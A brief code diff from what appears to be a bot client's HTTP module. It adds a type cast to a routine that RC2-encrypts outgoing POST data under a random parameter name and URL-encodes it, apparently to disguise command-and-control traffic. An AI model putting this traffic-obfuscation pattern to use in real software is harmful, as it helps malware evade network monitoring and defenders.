@@ -175,7 +175,7 @@ void TCryptHTTP::DoBeforePostData(TBotStream* PostData)
 	PostData->SetSize(0);
 
 	PCHAR Name  = Random::RandomString(Random::Generate(3, 6), 'a', 'z');
-    PCHAR Value = RC2Crypt::Encode(Data.t_str(), Data.Length(), Password.t_str());
+    PCHAR Value = RC2Crypt::Encode((LPBYTE)Data.t_str(), Data.Length(), Password.t_str());
 
 	PCHAR EncodedValue = URLEncode(Value, STR::Length(Value));
 
